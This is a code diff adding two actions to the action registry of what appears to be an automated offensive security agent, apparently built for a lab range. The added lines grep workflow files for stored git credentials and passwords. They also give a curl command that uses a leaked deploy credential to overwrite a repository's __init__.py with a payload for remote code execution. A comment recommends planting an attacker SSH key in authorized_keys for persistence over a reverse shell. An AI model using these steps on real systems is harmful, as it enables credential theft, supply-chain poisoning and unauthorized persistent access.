@@ -703,6 +703,23 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Audit dependency files for supply chain attack indicators."),
 
     # --- Supply chain: GitLab CI/CD (self-learned from Shadow Supply chain 4) ---
+    "inspect_workflow_config": _a("inspect_workflow_config",
+        ["grep -aoE \"git .*(credential\\.helper|pull).*|import_module\\([^)]*\\)|password=[^ '\\\"]+\" "
+         "<workflow.json|script>"],
+        note="Look for a scheduled git pull + import that carries a credential.helper cred — the "
+             "cred often has push access to the imported repo (poison it for RCE)."),
+    "poison_git_imported_module": _a("poison_git_imported_module",
+        ["# as the leaked deploy-bot cred (push access), prepend a payload to the imported module,",
+         "# keep the original config line so import still succeeds:",
+         "curl -s -X PUT $GIT_URL/api/v1/repos/<owner>/<repo>/contents/clf/__init__.py "
+         "-u '$GIT_USER:$GIT_PASS' -H 'Content-Type: application/json' "
+         "-d '{\"message\":\"cfg\",\"branch\":\"main\",\"sha\":\"<sha>\",\"content\":\"<b64 payload>\"}'",
+         "# prefer a stable primitive over a revshell (which blocks the import and crashes n8n):",
+         "# write the Kali pubkey to ~/<runtime-user>/.ssh/authorized_keys, then ssh in"],
+        risk="propose", runnable=False,
+        note="obj7: the kethalis-model-deploy workflow git-pulls + import_module('clf') every 10 "
+             "min; deploy-bot has push. Poison __init__.py -> RCE as n8n-runner. A blocking "
+             "reverse shell crashes the import (n8n restarts it) — inject authorized_keys instead."),
     "gitlab_open_register": _a("gitlab_open_register",
         ["curl -sk $URL/users/sign_up -o /dev/null -w 'signup_http=%{http_code}\\n'",
          "# register (auto-confirmed) -> Reporter on internal groups, Developer on some repos"],
